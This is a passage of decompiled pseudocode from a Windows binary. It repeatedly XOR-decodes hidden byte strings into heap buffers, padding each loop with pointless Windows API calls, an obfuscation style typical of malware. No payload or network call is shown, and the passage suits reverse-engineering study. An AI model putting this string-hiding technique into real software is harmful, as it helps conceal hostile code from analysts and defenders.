var_8h._1_1_ = 0x18;\n    var_8h._2_1_ = 0x23;\n    var_8h._3_1_ = 0x54;\n    var_4h._0_1_ = 0x31;\n    var_4h._1_1_ = 0x13;\n    var_4h._2_1_ = 0xb;\n    var_4h._3_1_ = 0x4a;\n    var_88h = 0x384a6e74;\n    var_84h._0_1_ = 0x54;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_98h = iVar6;\n    var_2ch = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar8 != 0x6b2cf2) {\n            *(iVar7 + iVar6) = *(&var_88h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1c);\n    fcn.0040d324();\n    var_1ch._0_1_ = 0x29;\n    var_1ch._1_1_ = 0x27;\n    var_1ch._2_1_ = 4;\n    var_1ch._3_1_ = 0x17;\n    var_18h._0_1_ = 0x22;\n    var_18h._1_1_ = 0x12;\n    var_18h._2_1_ = 0x2b;\n    var_18h._3_1_ = 0x27;\n    var_14h._0_1_ = 0x13;\n    var_14h._1_1_ = 0;\n    var_14h._2_1_ = 0x19;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 0x26;\n    var_10h._1_1_ = 3;\n    var_10h._2_1_ = 0x2f;\n    var_10h._3_1_ = 0xe;\n    var_ch._0_1_ = 0x12;\n    var_ch._1_1_ = 0x3b;\n    var_ch._2_1_ = 0x1f;\n    var_ch._3_1_ = 0x37;\n    var_8h._0_1_ = 0x13;\n    var_8h._1_1_ = 0x2e;\n    var_8h._2_1_ = 0x2c;\n    var_8h._3_1_ = 0x11;\n    var_4h._0_1_ = 0x24;\n    var_4h._1_1_ = 0x7a;\n    var_80h = 0x7649427a;\n    var_7ch._0_1_ = 0x41;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_88h = iVar6;\n    var_2ch = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar8 != 0x35f31c) {\n            *(iVar7 + iVar6) = *(&var_80h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1a);\n    fcn.0040d324();\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x54;\n    var_10h._2_1_ = 0x22;\n    var_10h._3_1_ = 0x2b;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 8;\n    var_ch._2_1_ = 0x43;\n    var_ch._3_1_ = 0x1f;\n    var_8h._0_1_ = 0x3e;\n    var_8h._1_1_ = 0x38;\n    var_8h._2_1_ = 0x34;\n    var_8h._3_1_ = 0x54;\n    var_4h._0_1_ = 0x11;\n    var_4h._1_1_ = 0x2d;\n    var_4h._2_1_ = 0x51;\n    var_78h = 0x48763158;\n    var_74h._0_1_ = 0x51;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_80h = iVar6;\n    var_2ch = &var_10h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar8 != 0x437cc1) {\n            *(iVar7 + iVar6) = *(&var_78h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    fcn.0040d324();\n    var_14h._0_1_ = 6;\n    var_14h._1_1_ = 2;\n    var_14h._2_1_ = 0x19;\n    var_14h._3_1_ = 0xe;\n    var_10h._0_1_ = 0x57;\n    var_10h._1_1_ = 0x20;\n    var_10h._2_1_ = 0x15;\n    var_10h._3_1_ = 0x23;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 0x4d;\n    var_ch._2_1_ = 5;\n    var_ch._3_1_ = 0x15;\n    var_8h._0_1_ = 0x23;\n    var_8h._1_1_ = 0x1d;\n    var_8h._2_1_ = 0x5d;\n    var_8h._3_1_ = 0x39;\n    var_4h._0_1_ = 2;\n    var_4h._1_1_ = 0x2d;\n    var_4h._2_1_ = 0xe;\n    var_4h._3_1_ = 0x34;\n    var_70h = 0x6b4a6755;\n    var_6ch._0_1_ = 0x34;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_78h = iVar6;\n    var_2ch = &var_14h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar8 != 0xc0b18e) {\n            *(iVar7 + iVar6) = *(&var_70h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_14h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x14);\n    fcn.0040d324();\n    var_1ch._0_1_ = 0x18;\n    var_1ch._1_1_ = 0x2a;\n    var_1ch._2_1_ = 0x37;\n    var_1ch._3_1_ = 0x38;\n    var_18h._0_1_ = 9;\n    var_18h._1_1_ = 0x1c;\n    var_18h._2_1_ = 4;\n    var_18h._3_1_ = 0x38;\n    var_14h._0_1_ = 0xd;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 0x10;\n    var_14h._3_1_ = 10;\n    var_10h._0_1_ = 0x23;\n    var_10h._1_1_ = 0x26;\n    var_10h._2_1_ = 0x13;\n    var_10h._3_1_ = 9;\n    var_ch._0_1_ = 0x10;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 0x3d;\n    var_ch._3_1_ = 0x26;\n    var_8h._0_1_ = 0xf;\n    var_8h._1_1_ = 0x3c;\n    var_8h._2_1_ = 5;\n    var_8h._3_1_ = 0x1c;\n    var_4h._0_1_ = 0x4b;\n    var_28h = 0x59634f4b;\n    var_24h._0_2_ = 0x7962;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_70h = iVar6;\n    var_2ch = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar8 != 0x3b74d4) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x19);\n    fcn.0040d324();\n    var_18h._0_1_ = 0x67;\n    var_18h._1_1_ = 0x52;\n    var_18h._2_1_ = 5;\n    var_18h._3_1_ = 0x38;\n    var_14h._0_1_ = 7;\n    var_14h._1_1_ = 0x32;\n    var_14h._2_1_ = 0x70;\n    var_14h._3_1_ = 0x45;\n    var_10h._0_1_ = 0x20;\n    var_10h._1_1_ = 0x21;\n    var_10h._2_1_ = 3;\n    var_10h._3_1_ = 0x24;\n    var_ch._0_1_ = 100;\n    var_ch._1_1_ = 0x45;\n    var_ch._2_1_ = 0x20;\n    var_ch._3_1_ = 0x21;\n    var_8h._0_1_ = 0xf;\n    var_8h._1_1_ = 0x3a;\n    var_8h._2_1_ = 0x51;\n    var_8h._3_1_ = 0x50;\n    var_4h._0_1_ = 0x2c;\n    var_4h._1_1_ = 0x57;\n    var_28h = 0x57493734;\n    var_24h._0_2_ = 0x5666;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_2ch = &var_18h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar8 != 0x4e1603) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_18h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    fcn.0040d324();\n    var_1ch._0_1_ = 99;\n    var_1ch._1_1_ = 0x28;\n    var_1ch._2_1_ = 0x62;\n    var_1ch._3_1_ = 0x3a;\n    var_18h._0_1_ = 0x31;\n    var_18h._1_1_ = 0x44;\n    var_18h._2_1_ = 0x28;\n    var_18h._3_1_ = 0x5c;\n    var_14h._0_1_ = 0x13;\n    var_14h._1_1_ = 0x30;\n    var_14h._2_1_ = 0x5f;\n    var_14h._3_1_ = 0x2b;\n    var_10h._0_1_ = 0x58;\n    var_10h._1_1_ = 0x2f;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x60;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 0x58;\n    var_ch._2_1_ = 0x35;\n    var_ch._3_1_ = 0x2b;\n    var_8h._0_1_ = 0x5c;\n    var_8h._1_1_ = 0x28;\n    var_8h._2_1_ = 0x56;\n    var_8h._3_1_ = 0x26;\n    var_4h._0_1_ = 0x42;\n    var_50h = 0x43314d30;\n    var_4ch._0_1_ = 0x42;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_2ch = &var_1ch - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar9 != 0xdf0f1d) {\n            *(iVar8 + iVar7) = *(&var_50h + iVar8 % var_34h) ^ (iVar8 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x19);\n    fcn.0040d324();\n    var_18h._0_1_ = 0x3e;\n    var_18h._1_1_ = 0x17;\n    var_18h._2_1_ = 0x3d;\n    var_18h._3_1_ = 0x2c;\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 0x19;\n    var_14h._2_1_ = 0x17;\n    var_14h._3_1_ = 3;\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 0x31;\n    var_10h._2_1_ = 0;\n    var_10h._3_1_ = 0x17;\n    var_ch._0_1_ = 0x3e;\n    var_ch._1_1_ = 0x27;\n    var_ch._2_1_ = 0x31;\n    var_ch._3_1_ = 0x1b;\n    var_8h._0_1_ = 0x1b;\n    var_8h._1_1_ = 2;\n    var_8h._2_1_ = 0x30;\n    var_8h._3_1_ = 0x3f;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x72;\n    var_c8h = 0x556e726d;\n    var_c4h._0_1_ = 0x58;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_50h = iVar8;\n    var_2ch = &var_18h - iVar8;\n    do {\n        iVar10 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar10 != 0x39e51) {\n            *(iVar9 + iVar8) = *(&var_c8h + iVar9 % var_34h) ^ (iVar9 + iVar8)[&var_18h - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x16);\n    fcn.0040d324();\n    var_20h._0_1_ = 4;\n    var_20h._1_1_ = 10;\n    var_20h._2_1_ = 0x18;\n    var_20h._3_1_ = 5;\n    var_1ch._0_1_ = 0xb;\n    var_1ch._1_1_ = 0x50;\n    var_1ch._2_1_ = 0x3e;\n    var_1ch._3_1_ = 3;\n    var_18h._0_1_ = 0x2d;\n    var_18h._1_1_ = 0x24;\n    var_18h._2_1_ = 0xd;\n    var_18h._3_1_ = 0x58;\n    var_14h._0_1_ = 0x30;\n    var_14h._1_1_ = 3;\n    var_14h._2_1_ = 0x2d;\n    var_14h._3_1_ = 0x27;\n    var_10h._0_1_ = 0x16;\n    var_10h._1_1_ = 0x59;\n    var_10h._2_1_ = 0x34;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 0x3b;\n    var_ch._1_1_ = 4;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 0x44;\n    var_8h._0_1_ = 0x3e;\n    var_8h._1_1_ = 0x19;\n    var_8h._2_1_ = 0x21;\n    var_8h._3_1_ = 0x1b;\n    var_4h._0_1_ = 1;\n    var_4h._1_1_ = 0x51;\n    var_4h._2_1_ = 0x32;\n    var_4h._3_1_ = 0x6f;\n    var_28h = 0x77486f57;\n    var_24h._0_2_ = 0x3664;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_c8h = iVar8;\n    var_2ch = &var_20h - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar10 != 0xfb2cdd) {\n            *(iVar9 + iVar8) = *(&var_28h + iVar9 % var_38h) ^ (iVar9 + iVar8)[&var_20h - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x20);\n    fcn.0040d324();\n    var_20h._3_1_ = 6;\n    var_20h._0_1_ = 0x3f;\n    var_20h._1_1_ = 0x33;\n    var_20h._2_1_ = 0x2c;\n    var_1ch._0_1_ = 0x52;\n    var_1ch._1_1_ = 0x45;\n    var_1ch._2_1_ = 9;\n    var_1ch._3_1_ = 0x37;\n    var_18h._0_1_ = 0x16;\n    var_18h._1_1_ = 0xd;\n    var_18h._2_1_ = 0x73;\n    var_18h._3_1_ = 0x56;\n    var_14h._0_1_ = 0x1f;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0x35;\n    var_14h._3_1_ = 0x1a;\n    var_10h._0_1_ = 0x58;\n    var_10h._1_1_ = 0x58;\n    var_10h._2_1_ = 0x1e;\n    var_10h._3_1_ = 0x3f;\n    var_ch._0_1_ = 0x11;\n    var_ch._1_1_ = 0x11;\n    var_ch._2_1_ = 0x61;\n    var_ch._3_1_ = 0x45;\n    var_8h._0_1_ = 5;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 0xc;\n    var_8h._3_1_ = 4;\n    var_4h._0_1_ = 0x54;\n    var_4h._1_1_ = 0x50;\n    var_4h._2_1_ = 9;\n    var_4h._3_1_ = 0x56;\n    var_28h = 0x6865566c;\n    var_24h._0_2_ = 0x3731;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_2ch = &var_20h - iVar8;\n    do {\n        iVar10 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar10 != 0x388628) {\n            *(iVar9 + iVar8) = *(&var_28h + iVar9 % var_38h) ^ (iVar9 + iVar8)[&var_20h - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x20);\n    fcn.0040d324();\n    var_1ch._0_1_ = 0x17;\n    var_1ch._1_1_ = 0x28;\n    var_1ch._2_1_ = 0xe;\n    var_1ch._3_1_ = 0x22;\n    var_18h._0_1_ = 8;\n    var_18h._1_1_ = 0x25;\n    var_18h._2_1_ = 0x39;\n    var_18h._3_1_ = 0x28;\n    var_14h._0_1_ = 0;\n    var_14h._1_1_ = 0xc;\n    var_14h._2_1_ = 0x23;\n    var_14h._3_1_ = 0x28;\n    var_10h._0_1_ = 0x2b;\n    var_10h._1_1_ = 0x39;\n    var_10h._2_1_ = 1;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 0x3f;\n    var_ch._2_1_ = 0x39;\n    var_ch._3_1_ = 0x1b;\n    var_8h._0_1_ = 0x2d;\n    var_8h._1_1_ = 0x21;\n    var_8h._2_1_ = 0x28;\n    var_8h._3_1_ = 0x37;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x44;\n    var_c0h = 0x504d4d44;\n    var_bch._0_1_ = 0x6d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar10 = 0;\n    var_2ch = &var_1ch - iVar9;\n    do {\n        iVar11 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar11 != 0x8ded58) {\n            *(iVar10 + iVar9) = *(&var_c0h + iVar10 % var_34h) ^ (iVar10 + iVar9)[&var_1ch - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x1a);\n    fcn.0040d324();\n    var_1ch._0_1_ = 0x10;\n    var_1ch._1_1_ = 7;\n    var_1ch._2_1_ = 0x17;\n    var_1ch._3_1_ = 0x4b;\n    var_18h._0_1_ = 0x11;\n    var_18h._1_1_ = 0x22;\n    var_18h._2_1_ = 0x16;\n    var_18h._3_1_ = 0x31;\n    var_14h._0_1_ = 0x69;\n    var_14h._1_1_ = 0x11;\n    var_14h._2_1_ = 0x31;\n    var_14h._3_1_ = 0xf;\n    var_10h._0_1_ = 0x35;\n    var_10h._1_1_ = 0x57;\n    var_10h._2_1_ = 0x11;\n    var_10h._3_1_ = 0x2d;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 4;\n    var_ch._2_1_ = 0x4b;\n    var_ch._3_1_ = 0x1d;\n    var_8h._0_1_ = 0x35;\n    var_8h._1_1_ = 0xb;\n    var_8h._2_1_ = 0x38;\n    var_8h._3_1_ = 0x5c;\n    var_4h._0_1_ = 0x13;\n    var_4h._1_1_ = 0x26;\n    var_4h._2_1_ = 0x62;\n    var_b8h = 0x39546243;\n    var_b4h._0_1_ = 0x74;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_c0h = iVar10;\n    var_2ch = &var_1ch - iVar10;\n    do {\n        iVar12 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar12 != 0xb20fbc) {\n            *(iVar11 + iVar10) = *(&var_b8h + iVar11 % var_34h) ^ (iVar11 + iVar10)[&var_1ch - iVar10];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x1b);\n    fcn.0040d324();\n    var_14h._0_1_ = 0x25;\n    var_14h._1_1_ = 2;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x23;\n    var_10h._0_1_ = 0x2e;\n    var_10h._1_1_ = 0x20;\n    var_10h._2_1_ = 3;\n    var_10h._3_1_ = 0x17;\n    var_ch._0_1_ = 0x24;\n    var_ch._1_1_ = 0x30;\n    var_ch._2_1_ = 0x24;\n    var_ch._3_1_ = 0x3d;\n    var_8h._0_1_ = 0x1f;\n    var_8h._1_1_ = 0xb;\n    var_8h._2_1_ = 0x11;\n    var_8h._3_1_ = 0x25;\n    var_4h._0_1_ = 0x28;\n    var_4h._1_1_ = 0x4b;\n    var_28h = 0x42746776;\n    var_24h._0_2_ = 0x4b4d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_b8h = iVar10;\n    var_2ch = &var_14h - iVar10;\n    do {\n        iVar12 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar12 != 0x5d1e9e) {\n            *(iVar11 + iVar10) = *(&var_28h + iVar11 % var_38h) ^ (iVar11 + iVar10)[&var_14h - iVar10];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x12);\n    fcn.0040d324();\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 6;\n    var_14h._2_1_ = 0xb;\n    var_14h._3_1_ = 0x14;\n    var_10h._0_1_ = 0x44;\n    var_10h._1_1_ = 0x32;\n    var_10h._2_1_ = 0xc;\n    var_10h._3_1_ = 0x2b;\n    var_ch._0_1_ = 0x14;\n    var_ch._1_1_ = 0x67;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 10;\n    var_8h._0_1_ = 0x2f;\n    var_8h._1_1_ = 0x18;\n    var_8h._2_1_ = 0x5b;\n    var_8h._3_1_ = 0x23;\n    var_4h._0_1_ = 4;\n    var_4h._1_1_ = 0x3c;\n    var_4h._2_1_ = 0x71;\n    var_b0h = 0x71596346;\n    var_ach._0_1_ = 0x37;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_2ch = &var_14h - iVar10;\n    do {\n        iVar12 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar12 != 0x11da8d) {\n            *(iVar11 + iVar10) = *(&var_b0h + iVar11 % var_34h) ^ (iVar11 + iVar10)[&var_14h - iVar10];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x13);\n    fcn.0040d324();\n    var_14h._0_1_ = 0x3f;\n    var_14h._1_1_ = 0x27;\n    var_14h._2_1_ = 0x39;\n    var_14h._3_1_ = 0x32;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 0x2d;\n    var_10h._2_1_ = 8;\n    var_10h._3_1_ = 0x2d;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 0x34;\n    var_ch._2_1_ = 0x3b;\n    var_ch._3_1_ = 0x2b;\n    var_8h._0_1_ = 5;\n    var_8h._1_1_ = 0x34;\n    var_8h._2_1_ = 3;\n    var_8h._3_1_ = 0x36;\n    var_4h._0_1_ = 0xe;\n    var_4h._1_1_ = 0x3e;\n    var_4h._2_1_ = 9;\n    var_4h._3_1_ = 0x42;\n    var_28h = 0x5a6a426c;\n    var_24h._0_2_ = 0x596b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_b0h = iVar11;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar13 != 0x9aa0e1) {\n            *(iVar12 + iVar11) = *(&var_28h + iVar12 % var_38h) ^ (iVar12 + iVar11)[&var_14h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x14);\n    fcn.0040d324();\n    var_14h._0_1_ = 0x3b;\n    var_14h._1_1_ = 0x10;\n    var_14h._2_1_ = 9;\n    var_14h._3_1_ = 0x17;\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 0x1e;\n    var_10h._2_1_ = 0xf;\n    var_10h._3_1_ = 0x25;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 0x1d;\n    var_ch._3_1_ = 2;\n    var_8h._0_1_ = 4;\n    var_8h._1_1_ = 0x10;\n    var_8h._2_1_ = 0x2a;\n    var_8h._3_1_ = 0x17;\n    var_4h._0_1_ = 0x6b;\n    var_28h = 0x724d7568;\n    var_24h._0_2_ = 0x6b6b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar13 != 0x1d83d3) {\n            *(iVar12 + iVar11) = *(&var_28h + iVar12 % var_38h) ^ (iVar12 + iVar11)[&var_14h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x11);\n    fcn.0040d324();\n    var_14h._0_1_ = 0x21;\n    var_14h._1_1_ = 0x56;\n    var_14h._2_1_ = 0x74;\n    var_14h._3_1_ = 0x14;\n    var_10h._0_1_ = 0x36;\n    var_10h._1_1_ = 0x1b;\n    var_10h._2_1_ = 0x47;\n    var_10h._3_1_ = 0x65;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 0x3b;\n    var_ch._2_1_ = 4;\n    var_ch._3_1_ = 0x5a;\n    var_8h._0_1_ = 0x59;\n    var_8h._1_1_ = 4;\n    var_8h._2_1_ = 0x35;\n    var_8h._3_1_ = 0x17;\n    var_4h._0_1_ = 0x33;\n    var_a0h = 0x61353372;\n    var_9ch._0_1_ = 0x52;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar13 = 0;\n    var_2ch = &var_14h - iVar12;\n    do {\n        iVar14 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar14 != 0xf285fb) {\n            *(iVar13 + iVar12) = *(&var_a0h + iVar13 % var_34h) ^ (iVar13 + iVar12)[&var_14h - iVar12];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0x11);\n    fcn.0040d324();\n    var_1ch._3_1_ = 5;\n    var_20h._0_1_ = 0x2a;\n    var_20h._1_1_ = 0xd;\n    var_20h._2_1_ = 0x3b;\n    var_20h._3_1_ = 0x3f;\n    var_1ch._0_1_ = 0x37;\n    var_1ch._1_1_ = 0x10;\n    var_1ch._2_1_ = 0x1c;\n    var_18h._0_1_ = 0x2d;\n    var_18h._1_1_ = 0x28;\n    var_18h._2_1_ = 0x32;\n    var_18h._3_1_ = 0xd;\n    var_14h._0_1_ = 0xb;\n    var_14h._1_1_ = 7;\n    var_14h._2_1_ = 6;\n    var_14h._3_1_ = 0x2b;\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 10;\n    var_10h._2_1_ = 0xd;\n    var_10h._3_1_ = 0x38;\n    var_ch._0_1_ = 0x1a;\n    var_ch._1_1_ = 0x2f;\n    var_ch._2_1_ = 0x32;\n    var_ch._3_1_ = 0xd;\n    var_8h._0_1_ = 0x15;\n    var_8h._1_1_ = 0xd;\n    var_8h._2_1_ = 0xf;\n    var_8h._3_1_ = 0x23;\n    var_4h._0_1_ = 0x44;\n    var_28h = 0x46686879;\n    var_24h._0_2_ = 0x6444;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_a0h = iVar13;\n    var_2ch = &var_20h - iVar13;\n    do {\n        iVar15 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar15 != 0x393f6) {\n            *(iVar14 + iVar13) = *(&var_28h + iVar14 % var_38h) ^ (iVar14 + iVar13)[&var_20h - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x1d);\n    fcn.0040d324();\n    var_18h._0_1_ = 0x2a;\n    var_18h._1_1_ = 3;\n    var_18h._2_1_ = 0x75;\n    var_18h._3_1_ = 7;\n    var_14h._0_1_ = 0x22;\n    var_14h._1_1_ = 0x17;\n    var_14h._2_1_ = 1;\n    var_14h._3_1_ = 0x53;\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 0x2c;\n    var_10h._2_1_ = 0xd;\n    var_10h._3_1_ = 0xf;\n    var_ch._0_1_ = 0x50;\n    var_ch._1_1_ = 0x16;\n    var_ch._2_1_ = 0x13;\n    var_ch._3_1_ = 0xb;\n    var_8h._0_1_ = 0xf;\n    var_8h._1_1_ = 0x40;\n    var_8h._2_1_ = 6;\n    var_8h._3_1_ = 0x2f;\n    var_4h._0_1_ = 0x1c;\n    var_4h._1_1_ = 1;\n    var_4h._2_1_ = 0x53;\n    var_4h._3_1_ = 0x6f;\n    var_90h = 0x6f366679;\n    var_8ch._0_1_ = 0x43;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_2ch = &var_18h - iVar13;\n    do {\n        iVar15 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar15 != 0x4c2f5b) {\n            *(iVar14 + iVar13) = *(&var_90h + iVar14 % var_34h) ^ (iVar14 + iVar13)[&var_18h - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x18);\n    fcn.0040d324();\n    var_1ch._0_1_ = 5;\n    var_1ch._1_1_ = 0xb;\n    var_1ch._2_1_ = 0x26;\n    var_1ch._3_1_ = 0x27;\n    var_18h._0_1_ = 0x22;\n    var_18h._2_1_ = 0x22;\n    var_18h._3_1_ = 0xb;\n    var_14h._0_1_ = 0x27;\n    var_14h._1_1_ = 0x2a;\n    var_14h._2_1_ = 0x3a;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0x32;\n    var_10h._1_1_ = 1;\n    var_10h._2_1_ = 3;\n    var_10h._3_1_ = 0x2c;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x18;\n    var_8h._0_1_ = 0x1d;\n    var_8h._1_1_ = 0x2e;\n    var_8h._2_1_ = 0x2a;\n    var_8h._3_1_ = 0xd;\n    var_4h._0_1_ = 0x33;\n    var_4h._1_1_ = 